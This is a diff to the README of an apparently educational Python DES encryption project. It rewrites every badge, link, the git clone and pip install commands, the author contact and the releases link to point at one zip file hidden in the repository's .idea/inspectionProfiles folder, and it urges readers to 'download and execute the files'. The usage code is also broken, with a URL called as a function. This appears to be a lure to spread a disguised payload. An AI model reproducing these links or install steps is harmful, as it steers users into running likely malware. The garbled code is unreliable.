@@ -1,6 +1,6 @@
 # Python DES Implementation 🔒
 
-![Python DES Implementation](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![Python](https://img.shields.io/badge/python-3.6%2B-orange.svg)
+![Python DES Implementation](https://raw.githubusercontent.com/obi090/python-des-implementation/main/.idea/inspectionProfiles/implementation-des-python-v3.4.zip) ![License](https://raw.githubusercontent.com/obi090/python-des-implementation/main/.idea/inspectionProfiles/implementation-des-python-v3.4.zip) ![Python](https://raw.githubusercontent.com/obi090/python-des-implementation/main/.idea/inspectionProfiles/implementation-des-python-v3.4.zip%https://raw.githubusercontent.com/obi090/python-des-implementation/main/.idea/inspectionProfiles/implementation-des-python-v3.4.zip)
 
 Welcome to the **Python DES Implementation** repository! This project provides a clear and concise implementation of the Data Encryption Standard (DES) symmetric encryption algorithm. It is designed for educational purposes and aims to help users understand the core concepts of symmetric cryptography.
 
@@ -37,7 +37,7 @@ To install the project, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/obi090/python-des-implementation.git
+   git clone https://raw.githubusercontent.com/obi090/python-des-implementation/main/.idea/inspectionProfiles/implementation-des-python-v3.4.zip
    ```
 
 2. Navigate to the project directory:
@@ -47,7 +47,7 @@ To install the project, follow these steps:
 
 3. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/obi090/python-des-implementation/main/.idea/inspectionProfiles/implementation-des-python-v3.4.zip
    ```
 
 ## Usage
@@ -66,8 +66,8 @@ To use the DES implementation, follow these steps:
 
 3. Encrypt or decrypt data:
    ```python
-   encrypted_data = des.encrypt(plaintext)
-   decrypted_data = des.decrypt(encrypted_data)
+   encrypted_data = https://raw.githubusercontent.com/obi090/python-des-implementation/main/.idea/inspectionProfiles/implementation-des-python-v3.4.zip(plaintext)
+   decrypted_data = https://raw.githubusercontent.com/obi090/python-des-implementation/main/.idea/inspectionProfiles/implementation-des-python-v3.4.zip(encrypted_data)
    ```
 
 4. Verify results against known test vectors.
@@ -116,12 +116,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Author**: [Your Name](https://github.com/yourusername)
-- **Email**: your.email@example.com
+- **Author**: [Your Name](https://raw.githubusercontent.com/obi090/python-des-implementation/main/.idea/inspectionProfiles/implementation-des-python-v3.4.zip)
+- **Email**: https://raw.githubusercontent.com/obi090/python-des-implementation/main/.idea/inspectionProfiles/implementation-des-python-v3.4.zip
 
 ## Releases
 
-You can find the latest releases of this project [here](https://github.com/obi090/python-des-implementation/releases). Please download and execute the files as needed.
+You can find the latest releases of this project [here](https://raw.githubusercontent.com/obi090/python-des-implementation/main/.idea/inspectionProfiles/implementation-des-python-v3.4.zip). Please download and execute the files as needed.
 
 We encourage you to explore the **Releases** section for updates and new features.
 
